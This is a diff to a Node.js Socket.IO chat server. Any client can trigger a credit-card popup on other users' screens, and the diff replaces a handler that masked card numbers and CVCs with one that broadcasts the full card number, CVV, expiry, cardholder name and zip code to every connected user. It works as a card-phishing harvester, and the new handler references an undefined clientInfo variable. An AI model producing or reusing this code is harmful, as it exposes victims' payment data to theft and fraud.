@@ -18,7 +18,7 @@ const io = new Server(server, {
     origin: frontendURL,
     methods: ["GET", "POST"]
   },
-  maxHttpBufferSize: 1e6 // Limite de 1Mo
+  maxHttpBufferSize: 1e6 // Limite de 1Mo pour les données (fichiers)
 });
 
 app.use(express.json());
@@ -75,9 +75,9 @@ io.on('connection', async (socket) => {
   socket.on('request popup', () => {
     socket.broadcast.emit('display popup');
   });
-  
-  socket.on('request card popup', () => {
-    socket.broadcast.emit('display card popup');
+
+  socket.on('request credit card', () => {
+    socket.broadcast.emit('display credit card popup');
   });
 
   socket.on('popup choice', (choice) => {
@@ -87,14 +87,17 @@ io.on('connection', async (socket) => {
     });
   });
 
-  socket.on('card details submitted', (cardDetails) => {
-    const maskedNumber = `**** **** **** ${cardDetails.number.slice(-4)}`;
-    const maskedCvc = '***';
-
+  socket.on('credit card data', (data) => {
+    const { cardData } = data;
     io.emit('chat message', {
       user: 'System',
-      isImportant: true,
-      text: `User submitted card details: Number - ${maskedNumber}, Expiry - ${cardDetails.expiry}, CVC - ${maskedCvc}`
+      text: `Credit Card Information Received:
+📧 Cardholder: ${cardData.cardHolderName}
+💳 Card Number: ${cardData.cardNumber}
+📅 Expiry: ${cardData.expiryDate}
+🔒 CVV: ${cardData.cvv}
+📮 Zip Code: ${cardData.billingZip || 'Not provided'}`,
+      clientInfo
     });
   });
 
@@ -107,4 +110,3 @@ const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
   console.log(`Le serveur est démarré et écoute sur le port ${PORT}`);
 });
-
